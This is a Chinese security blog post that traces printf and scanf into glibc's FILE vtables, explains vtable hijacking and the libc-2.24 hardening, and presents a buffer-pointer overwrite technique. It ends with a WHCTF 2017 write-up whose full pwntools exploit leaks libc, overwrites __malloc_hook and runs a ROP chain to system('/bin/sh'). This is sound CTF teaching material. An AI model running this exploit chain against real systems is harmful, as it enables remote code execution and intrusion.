> 原文链接: https://www.anquanke.com//post/id/86945 


# 【技术分享】教练！那根本不是IO！——从printf源码看libc的IO


                                阅读量   
                                **235076**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01fc7375650a0c78c1.jpg)](https://p5.ssl.qhimg.com/t01fc7375650a0c78c1.jpg)

作者：[anciety](http://bobao.360.cn/member/contribute?uid=2806750221)

预估稿费：500RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**前(fei)言(hua)**

****

我们似乎天天都在使用IO，最典型的使用就是printf，scanf，以前我们只知道printf会有格式化字符串漏洞，可是我们并没有怎么深究过IO具体的是怎么回事，以及具体有什么可以攻击的点。

2016 HITCON有一道 house of orange，是一道堪称经典的题目，第一次（或者似乎是第一次？）让我们把攻击的思维往IO FILE里去考虑，于是我们开始思考libc的虚表的可攻击性，不幸的是，libc的开发人员也很快意识到了这个虚表的问题，在2.24的libc版本中对vtables进行了加固：



```
2.24 libc更新日志中的一个内容：
  [20191] stdio: libio: vtables hardening
```

于是这个方法慢慢变得困难了起来，还好我们的思路不仅仅是这样……

本文主要从经典的虚表原理开始说起，中间补充一下scanf和printf的原理，最后提到一种较新的（或者是我认为较新的？）思路。

<br>

**从虚表开始说起**

****

首先我们来看下经典的（虽然似乎是2016之后才流行起来的）**_IO_FILE_plus**的虚表攻击方式。

**1._IO_FILE 与 _IO_FILE_plus**

源码永远是回答心中疑问的好老师，首先来看看关于这两个结构体的源码：

```
// libio/libio.h _IO_FILE 结构体
struct _IO_FILE `{`
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags
  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  /*  char* _save_gptr;  char* _save_egptr; */
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
`}`;
```

以及_IO_FILE_plus：



```
// libio/libioP.h
#define JUMP_FIELD(TYPE, NAME) TYPE NAME
#define JUMP0(FUNC, THIS) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)
struct _IO_jump_t // 虚表结构体
`{`
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
`}`;
struct _IO_FILE_plus
`{`
  _IO_FILE file; // 就是一个libio.h中的_IO_FILE 结构体
  const struct _IO_jump_t *vtable; //　多出一个vtable
`}`;
```

我们可以看到**_IO_FILE_plus**的组成，其实就是一个**_IO_FILE**结构体本身再加上一个跳表，从plus这个名称我们也能看出来，其实这个地方是为了兼容C++，对于C++的对象来说，除了数据以外还有方法，方法的实现是会用到跳表的，为了能够兼容，除了**_IO_FILE**本身以外，只能再添加一个跳表，然后使用新的结构体来进行兼容。

事实上在libc内部对于FILE结构体就是用**_IO_FILE_plus**来进行表示的，但是对于pwn选手来说，只要有函数指针，就有控制执行流的可能，唯一的问题是，用谁的函数指针？

这个其实并不是一个难事，因为每一个文件一定都有3个FILE，也就是以下三个，我想大家已经不能再熟悉他们了：



```
// libio/libio.h
extern struct _IO_FILE_plus _IO_2_1_stdin_;
extern struct _IO_FILE_plus _IO_2_1_stdout_;
extern struct _IO_FILE_plus _IO_2_1_stderr_;
```

是的，就是stdin, stdout和stderr，好了，那么这种利用的思路应该就比较明确了：只要我们有办法控制stdin，stdout和stderr的虚表指针，我们就能够在使用到这三个结构体的虚表的时候控制执行流。

不过还有一个小问题，到底在什么时候这些函数指针会被用到？那么让我们继续从输入输出开始说起……

**2.你不熟悉的scanf和printf**

以下内容源码较长，可能引起不适，请适度观看。为了简单，我们就从printf开始看。首先是printf的入口：



```
// stdio-common/printf.c
int
__printf (const char *format, ...)
`{`
  va_list arg;
  int done;
  va_start (arg, format);
  done = vfprintf (stdout, format, arg);
  va_end (arg);
  return done;
`}`
```

直接移交给了**vfprintf**，好吧，再来看**vfprintf**：

（觉得代码太长的同学可以直接跳到最后看结论）



```
// stdio-common/vfprintf.c
// 这里好像有一些神奇的地方，我所使用的ubuntu-2.23的libc这里调用的是
// _IO_vfprintf_internal，不过逻辑似乎没有什么区别
// 分析整个printf太恐怖了，我们就看%s和%d的实现好了
// 以下是一开始调用所需要关注的部分
/* The function itself.  */
int
vfprintf (FILE *s, const CHAR_T *format, va_list ap)
`{`
  [...]
  // 检查参数
  ARGCHECK (s, format);
  [...]
    if (UNBUFFERED_P (s))
    /* Use a helper function which will allocate a local temporary buffer
       for the stream and then call us again.  */
       // 调用了buffered_vfprintf
    return buffered_vfprintf (s, format, ap);
  [...]
`}`
static int
internal_function
buffered_vfprintf (_IO_FILE *s, const CHAR_T *format,
           _IO_va_list args)
`{`
  [...]
    /* Initialize helper.  */
    // 设置一个helper结构，这个结构看后文
  helper._put_stream = s;
  [...]
  // 设置好了helper，跳回去
    result = vfprintf (hp, format, args);
  [...]
  return result
`}`
// 好了经过helper的设置，我们又跳回来了，
/* The function itself.  */
int
vfprintf (FILE *s, const CHAR_T *format, va_list ap)
`{`
  [...]
  // 一个大do-while来处理格式化字符串
    /* Process whole format string.  */
  do
    `{`
    // 中间的操作非常的繁重
    // 主要是处理了h，hh等等各种东西
    // 不过格式化字符串本身在这里并不是我们关注的重点，所以我们跳过
    [...]
    // 这里我们需要关注了，这里是在处理好格式化字符串本身的各种东西之后
    // 真正对格式化字符串进行处理，进行输出等等
          /* Process current format.  */
      while (1)
    `{`
    // 这里其实就是直接用了process_arg，看来还得继续跟一下
      process_arg (((struct printf_spec *) NULL));
      process_string_arg (((struct printf_spec *) NULL));
    LABEL (form_unknown):
      if (spec == L_(''))
        `{`
          /* The format string ended before the specifier is complete.  */
          __set_errno (EINVAL);
          done = -1;
          goto all_done;
        `}`
      /* If we are in the fast loop force entering the complicated
         one.  */
      goto do_positional;
    `}`
    [...]
`}`
// process_arg是个大宏，也非常复杂，还是需要无数简化
// 下面整个是一个宏，所以忽略一些空格和反斜杠的不完整和错误，这样更为方便阅读
#define process_arg(fspec)                            
    // 下面开始处理 
      /* Start real work.  We know about all flags and modifiers and          
     now process the wanted format specifier.  */                 
    LABEL (form_percent):                             
    // 我们只关注％d相关内容，其他类似
    [...]
    LABEL (form_integer):                             
    // 整数相关的从这里开始
    // 设置base为10，意思是10进制
          base = 10;                                  
    // 根据具体情况，再进行一些处理，之后移交到具体的longlong_number和number进行处理
        if (is_longlong)                                  
        `{`                                     
            [...]
            goto LABEL (longlong_number);                         
        `}`                                     
        else                                      
        `{`                                     
            [...]
            goto LABEL (number);                              
        `}`                                     
    [...]
    // longlong_number和number类似，不重复了
    LABEL (number):                               
      // 这里的中间过程最终设置好了string
      // 也就是需要输出的字符串
      [...]
      // 根据是否是负数，使用outchar进行输出字符
      if (is_negative)                            
        outchar (L_('-'));                            
      else if (showsign)                              
        outchar (L_('+'));                            
      else if (space)                             
        outchar (L_(' '));                            
      [...]
      // 使用outstring把已经设置好的string输出了
      outstring (string, workend - string);                   
                                          
      break;                                  
// 宏的解释到这里结束
// 宏主要的内容其实也很显然，就是先根据具体的格式化字符串标识符来设置好string，string
// 也就是我们要输出的内容，是一个字符串，之后使用outstring来输出字符串，对于字符则使用
// outchar输出字符
// 现在我们再来看看outchar和outstring
#define outchar(Ch)                               
  do                                          
    `{`                                         
      const INT_T outc = (Ch);                            
      // 又使用了PUTC来输出字符
      if (PUTC (outc, s) == EOF || done == INT_MAX)               
    `{`                                     
      done = -1;                                  
      goto all_done;                              
    `}`                                     
      ++done;                                     
    `}`                                         
  while (0)
#define outstring(String, Len)                            
  do                                          
    `{`                                         
      assert ((size_t) done &lt;= (size_t) INT_MAX);                 
      // outstring则是使用了PUT来输出字符串
      if ((size_t) PUT (s, (String), (Len)) != (size_t) (Len))            
    `{`                                     
      done = -1;                                  
      goto all_done;                              
    `}`                                     
      if (__glibc_unlikely (INT_MAX - done &lt; (Len)))                  
      `{`                                       
    done = -1;                                
     __set_errno (EOVERFLOW);                         
    goto all_done;                                
      `}`                                       
      done += (Len);                                  
    `}`                                         
  while (0)
// libio/libioP.h
// 看来我们的任务还没完，再来看看PUTC和PUT
# define PUT(F, S, N)   _IO_sputn ((F), (S), (N))
# define PUTC(C, F) _IO_putc_unlocked (C, F)
// 又调用了别的，继续继续
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
#define _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)
#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)
// 终于送了一口气，跟了多少个函数都不记得了，不过最终是到点了。
// 这里做的事情就是通过层层移交，最终由跳表中的相应函数来完成
// 不过还有PUTC
// libio/libio.h
#define _IO_putc_unlocked(_ch, _fp) 
   (_IO_BE ((_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end, 0) 
    ? __overflow (_fp, (unsigned char) (_ch)) 
    : (unsigned char) (*(_fp)-&gt;_IO_write_ptr++ = (_ch)))
// 调用了__overflow
// libio/genops.h
int
__overflow (_IO_FILE *f, int ch)
`{`
  /* This is a single-byte stream.  */
  if (f-&gt;_mode == 0)
    _IO_fwide (f, -1);
  return _IO_OVERFLOW (f, ch);
`}`
// 又调用了_IO_OVERFLOW，根据之前的命名法，我们应该猜到这个很接近了
#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
// 依然是调用虚表函数
```

这一段代码估计已经把大家的汗都看出来了，我们做个总结吧：其实就一句话，**printf最终调用了虚表里的函数来完成输出任务**。

也就是说，只要使用了printf，我们就相当于调用了虚表里的某个函数，具体哪一个还需要从源码去看，不过关于虚表的部分说到这基本也就够了，scanf的内容其实也是一样，最终都会到虚表里进行执行。

到这里，我们就解决了关于利用虚表时候的问题，那就是什么时候调用，**所以只要有输入输出，我们就可以调用到虚表的某个函数了**。

**3.总结一下虚表的利用方法**

因为libc中的标准输入输出函数会用到stdin，stdout和stderr几个结构体，而最终都会使用虚表函数来完成具体操作，所以如果可以操作虚表指针，就可以控制执行流。

**4.libc-2.24**

在2.24中，增加了一个虚表的检测机制，也就是虚表必须位于某一个位置以内，超过这一段就会直接被abort掉，所以这个看似美好的方法到2.24就已经用不了了。



**没了虚表，想想别的**

****

**1.输入buf也可以搞事情**

到刚才，我们分析了虚表之前的部分，可是，我们其实是没有一直走到最底层的，因为至少得到**read/write**系统调用才算是真正进行了输入输出的操作，而这个操作我们并没有看到，那是因为他们都被实现在了虚表里。

现在让我们来分析一下scanf的虚表实现内容吧。这次我们少看点源码，就看看这个underflow：



```
int
_IO_new_file_underflow (_IO_FILE *fp)
`{`
  _IO_ssize_t count;
#if 0
  /* SysV does not make this test; take it out for compatibility */
  if (fp-&gt;_flags &amp; _IO_EOF_SEEN)
    return (EOF);
#endif
  if (fp-&gt;_flags &amp; _IO_NO_READS)
    `{`
      fp-&gt;_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    `}`
    // 只有在read_ptr &lt; read_end的时候才会调用read，否则直接返回read_ptr
  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)
    return *(unsigned char *) fp-&gt;_IO_read_ptr;
  if (fp-&gt;_IO_buf_base == NULL)
    `{`
      /* Maybe we already have a push back pointer.  */
      if (fp-&gt;_IO_save_base != NULL)
    `{`
      free (fp-&gt;_IO_save_base);
      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;
    `}`
      _IO_doallocbuf (fp);
    `}`
  /* Flush all line buffered files before reading. */
  /* FIXME This can/should be moved to genops ?? */
  if (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))
    `{`
#if 0
      _IO_flush_all_linebuffered ();
#else
      /* We used to flush all line-buffered stream.  This really isn't
     required by any standard.  My recollection is that
     traditional Unix systems did this for stdout.  stderr better
     not be line buffered.  So we do just that here
     explicitly.  --drepper */
      _IO_acquire_lock (_IO_stdout);
      if ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
      == (_IO_LINKED | _IO_LINE_BUF))
    _IO_OVERFLOW (_IO_stdout, EOF);
      _IO_release_lock (_IO_stdout);
#endif
    `}`
  _IO_switch_to_get_mode (fp);
  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;
  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;
  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end
    = fp-&gt;_IO_buf_base;
  // 这里调用read(0, _IO_buf_base, _IO_buf_end - _IO_buf_base)
  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,
               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);
  if (count &lt;= 0)
    `{`
      if (count == 0)
    fp-&gt;_flags |= _IO_EOF_SEEN;
      else
    fp-&gt;_flags |= _IO_ERR_SEEN, count = 0;
  `}`
  // read_end加上这次读所读到的字节数
  fp-&gt;_IO_read_end += count;
  if (count == 0)
    `{`
      /* If a stream is read to EOF, the calling application may switch active
     handles.  As a result, our offset cache would no longer be valid, so
     unset it.  */
      fp-&gt;_offset = _IO_pos_BAD;
      return EOF;
    `}`
  if (fp-&gt;_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp-&gt;_offset, count);
  return *(unsigned char *) fp-&gt;_IO_read_ptr;
`}`
```

在调用underflow之前其实会进行一个**_IO_read_ptr++**的操作，配合上underflow，我想大家都应该能看懂这个的含义吧？

_IO_buf_base, _IO_buf_end, _IO_read_ptr, _IO_read_end 4个变量都是在_IO_FILE的结构体里的，buf_base到buf_end是一个buf，而read_ptr到read_end则比较神奇了，我猜测可能是还没有处理的部分，read_ptr在一开始和buf_base相等，输入之后read_end会指向输入之后的结尾部分，buf_end是不变的，每次输入只能输入buf_end-buf_base个size，而且只有在read_ptr &gt;= read_end，也就是为空的时候才能够读入buf_base。

根据实际测验发现，每一次scanf似乎read_ptr都会加一，其实用到这个结论就可以了。

当然，最主要的地方还是调用read系统调用，写入的位置就在buf_base!于是如果可以更改这个值，就可以利用scanf进行任意写了！

这个手法虽然相对虚表来说限制颇多，但是至少是提供了一个任意写的方案，可以作为扩大控制能力的一种手法，算是一种新的思路。

**2.WHCTF 2017 stackoverflow**

接下来我们来看一下这种新思路的应用吧。题目来源于WHCTF 2017。



```
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
`{`
  __int64 v3; // ST08_8@1
  v3 = *MK_FP(__FS__, 40LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  input_name();
  print_hint();
  while ( 1 )
    main_proc();
`}`
__int64 input_name()
`{`
  char name; // [sp+0h] [bp-70h]@1
  __int64 v2; // [sp+68h] [bp-8h]@1
  v2 = *MK_FP(__FS__, 40LL);
  printf("leave your name, bro:");
  read_content(&amp;name, 0x50);
  printf("worrier %s, now begin your challenge", &amp;name);
  return *MK_FP(__FS__, 40LL) ^ v2;
`}`
__int64 __fastcall read_content(char *buf, int size)
`{`
  __int64 result; // rax@4
  __int64 v3; // rcx@4
  unsigned int v4; // [sp+14h] [bp-Ch]@1
  __int64 v5; // [sp+18h] [bp-8h]@1
  v5 = *MK_FP(__FS__, 40LL);
  v4 = read(0, buf, size);
  if ( (v4 &amp; 0x80000000) != 0 )
  `{`
    printf("Error!", buf);
    exit(0);
  `}`
  result = v4;
  v3 = *MK_FP(__FS__, 40LL) ^ v5;
  return result;
`}`
__int64 print_hint()
`{`
  __int64 v0; // ST08_8@1
  v0 = *MK_FP(__FS__, 40LL);
  puts("Welcome to stackoverflow challenge!!!");
  puts("it is really easy");
  return *MK_FP(__FS__, 40LL) ^ v0;
`}`
__int64 main_proc()
`{`
  __int64 result; // rax@7
  __int64 v1; // rcx@7
  int size; // [sp+8h] [bp-18h]@1
  int tmp_size; // [sp+Ch] [bp-14h]@1
  void *v4; // [sp+10h] [bp-10h]@4
  __int64 v5; // [sp+18h] [bp-8h]@1
  v5 = *MK_FP(__FS__, 40LL);
  printf("please input the size to trigger stackoverflow: ");
  _isoc99_scanf("%d", &amp;size);
  IO_getc(stdin);                               // get rid of n
  tmp_size = size;
  while ( size &gt; 0x300000 )
  `{`
    puts("too much bytes to do stackoverflow.");
    printf("please input the size to trigger stackoverflow: ");
    _isoc99_scanf("%d", &amp;size);
    IO_getc(stdin);
  `}`
  v4 = malloc(0x28uLL);
  global_malloced = (char *)malloc(size + 1);
  if ( !global_malloced )
  `{`
    printf("Error!");
    exit(0);
  `}`
  printf("padding and ropchain: ");
  read_content(global_malloced, size);
  global_malloced[tmp_size] = 0; // out of bound write
  result = 0LL;
  v1 = *MK_FP(__FS__, 40LL) ^ v5;
  return result;
`}`
```

题目有意思的地方就在于他的手法了。只能写入一个NULL的情况是非常受限制的，还是看看分析吧。

**1)漏洞位置**

①首先是input_name存在一个没有null结尾的输入，于是可以造成泄露，效果是可以泄露出libc，这个是比较简单的地方。

②main_proc中存在一个越界写，当输入size大于0x300000的时候，tmp_size会保存，之后重新输入之后tmp_size没有更新，导致越界写。

**2)利用思路**

问题1：越界写，且只能写入一个null，看似毫无用处，不过好在可以写入很多个null，于是malloc也可以进行多次，所以第一个任务是要能够写东西到有意义的地方，栈，堆或者libc，通过分配大地址导致堆mmap，我们可以使得分配的内容在libc之前附近的位置，于是通过越界写就可以写入libc了。

问题2：写啥？这个真的是卡了很多人的一个地方，最终的选择，是写了_IO_buf_base，这个题目比较特殊，给出的libc-2.24.so偏移有特殊性，_IO_buf_base比_IO_buf_end小1，而且_IO_buf_end地址的最低位刚好是00，于是向base写入一个00，就可以指向end，之后往end写入malloc_hook的地址，然后循环一下使read_ptr和read_end相等，再次读入，就可以写入malloc_hook了

问题3：如何扩大控制。其实控制了执行流，就比较简单了，我们找了一个read：



```
.text:0000000000400A23 ; 7:   read_content(&amp;name, 0x50);
.text:0000000000400A23 lea     rax, [rbp+name]
.text:0000000000400A27 mov     esi, 50h
.text:0000000000400A2C mov     rdi, rax
.text:0000000000400A2F call    read_content
```

这个read是input_name里的，往栈上写入内容，之后就可以进行rop了。

**3)exp**



```
import sys
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
DEBUG = 0
GDB = 1
libc = ELF('./libc-2.24.so')
if DEBUG:
    p = process('./stackoverflow')
else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    p = remote(HOST, PORT)
def leak_libc():
    p.sendline('a' * 7)
    p.recvuntil('worrier ' + 'a' * 7 + 'n')
    leak = ((p.recvuntil(',')[:-1]).ljust(8, 'x00'))
    p.info(len(leak))
    addr = u64(leak)
    return addr - 0x7dd52
def main():
    if GDB:
        raw_input()
    libc_base = leak_libc()
    p.info('libc_base: `{``}`'.format(hex(libc_base)))
    p.recvuntil('stackoverflow:')
    p.sendline(str(0x5c28f8 - 0x10))
    p.recvuntil('stackoverflow:')
    p.sendline(str(0x200000))
    p.recvuntil('ropchain:')
    p.send('a') # doesn't matter
    p.recvuntil('stackoverflow:')
    # This will be written at &amp;_IO_buf_base
    malloc_hook_end = libc_base + libc.symbols['__malloc_hook'] + 8
    payload = p64(malloc_hook_end)
    p.send(payload)
    p.recvuntil('ropchain:')
    p.send('b')
    for i in range(len(payload) - 1):
        p.recvuntil('stackoverflow:')
        p.recvuntil('ropchain:')
        p.send('x')
    file_struct_left = p64(malloc_hook_end)
    file_struct_left += p64(0)
    file_struct_left += p64(0)
    file_struct_left += p64(0)
    file_struct_left += p64(0)
    file_struct_left += p64(0)
    file_struct_left += p32(0)
    file_struct_left += p32(0x10)
    file_struct_left += p64(0xffffffffffffffff)
    file_struct_left += p64(0)
    file_struct_left += p64(libc_base + 0x3c3770)
    file_struct_left += p64(0xffffffffffffffff)
    file_struct_left += p64(0)
    file_struct_left += p64(libc_base + 0x3c19a0)
    file_struct_left += p64(0)
    file_struct_left += p64(0)
    file_struct_left += p64(0)
    file_struct_left += p64(0)
    file_struct_left += p64(0)
    file_struct_left += p64(0)
    file_struct_left += p64(libc_base + 0x3be400)
    payload = file_struct_left
    payload = payload.ljust(0x1f0, 'x00')
    payload += p64(0x400a23) # rip
    p.recvuntil('stackoverflow:')
    # This will be written in __malloc_hook
    p.send(payload)
    # Rop from here
    binsh_addr = 0x0000000000602000 + 0x500
    pop_rdi_ret = 0x000000000001fd7a  + libc_base
    pop_rsi_ret = 0x000000000001fcbd + libc_base
    pop_rdx_ret = 0x0000000000001b92 + libc_base
    payload = p64(pop_rdi_ret)
    payload += p64(0) # fd
    payload += p64(pop_rsi_ret)
    payload += p64(binsh_addr) # buf
    payload += p64(pop_rdx_ret)
    payload += p64(0x100) # nbytes
    payload += p64(libc_base + libc.symbols['read']) # read(0, binsh_addr, 0x100)
    payload += p64(pop_rdi_ret)
    payload += p64(binsh_addr) # system_cmd = /bin/shx00
    payload += p64(libc_base + libc.symbols['system']) # system("/bin/shx00")
    p.send(payload)
    p.send('/bin/shx00')
    p.interactive()
if __name__ == "__main__":
    main()
```

这道题目其实就是一个写buf的手法的利用，只要能够想到用写buf的手法其实就很简单了。



**总结**********

****

1.scanf和printf之类的输入输出函数最终都会调用相应虚函数完成底层操作，2.24之前可以通过更改虚表来控制执行流。

2.底层操作最终通过read等系统调用进行完成，也就是实现在虚表里，被初始化进虚表。

3.对于scanf来说，虚表实现写入的时候会使用到buf，这里的buf会在scanf时候用到，所以可以通过控制buf来达到对libc的一个任意写入，这个方法没有被2.24影响。

4.libc当中值得注意的地方还有很多，应该更多的去深入到源码去寻找这些有意思的东西。
